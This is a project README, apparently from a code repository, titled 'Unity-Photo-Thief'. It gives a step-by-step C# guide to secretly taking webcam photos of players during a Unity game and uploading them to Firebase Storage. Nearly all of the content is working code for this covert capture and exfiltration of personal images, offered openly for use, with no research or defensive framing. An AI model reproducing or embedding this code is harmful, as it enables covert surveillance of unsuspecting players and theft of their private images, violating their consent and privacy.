# Unity-Photo-Thief
In Unity, Capture users' photos in the middle of the game and store them in Firebase Storage. Cannot block the light next to the camera to indicate the working status

Watch the Set-Up : https://youtu.be/75S9ux7oRAg

# How Does It Work
1-Opens the webcam using the webcam texture class. (See:https://docs.unity3d.com/ScriptReference/WebCamTexture.html)

2-It takes the raw image from the webcam.

3-Assigns values ​​to the Texture2D object. Encodes raw image with Texture2D. 

4-Assigns the byte array to the File Directory converted to png and loads firebase.

# Here are the Codes of the Steps

## Using WebCam
Define the Webcam texture.
```
private WebCamTexture webcamTexture;
```
Get Available Cameras
```
WebCamDevice[] devices = WebCamTexture.devices;
if (devices.Length == 0)
{
      Debug.Log("Kamera bulunamadı.");
      return;
}
```
Turn on Webcam
```
webcamTexture = new WebCamTexture(devices[0].name);
webcamTexture.Play();
```

## Saving the image to a location
Capture image from camera in real time and save that image to a Texture2D object.
```
Texture2D snapshot = new Texture2D(webcamTexture.width, webcamTexture.height);
snapshot.SetPixels(webcamTexture.GetPixels());
snapshot.Apply();
```
## Save the Image 
```
byte[] bytes = snapshot.EncodeToPNG();
string fileName = "screenshot" + GetRandomFileName() + ".png";  // GetRandomFileName() isnt in the Unity Collections. You can code it. 
string filePath = Path.Combine(Application.persistentDataPath, fileName);
File.WriteAllBytes(filePath, bytes);
```

# Upload to Firebase

First Set the main settings about firebase (See: https://firebase.google.com/docs/unity/setup?hl=tr)

## Add Libraries
```
using Firebase;
using Firebase.Storage;
using System.Threading.Tasks;
```
Set the Referances
```
private FirebaseStorage firebaseStorage;
private StorageReference storageReference;
```
Creating objects
```
firebaseStorage = FirebaseStorage.DefaultInstance;
storageReference = firebaseStorage.GetReferenceFromUrl("YOUR STORAGE URL ex: gs://unity-capture-project.appspot.com");
```
Upload Image to Firebase
```
private void UploadImageToFirebase(string filePath, string fileName)
{
      storageReference.Child(fileName).PutFileAsync(filePath)
      .ContinueWith((Task<StorageMetadata> task) =>
      {
            if (task.IsFaulted || task.IsCanceled)
            {
                  Debug.Log("Yükleme başarısız oldu.");
            }
            else
            {
            Debug.Log("Görüntü başarıyla Firebase'e yüklendi.");
            }
      });
}

UploadImageToFirebase(filePath, fileName);
```
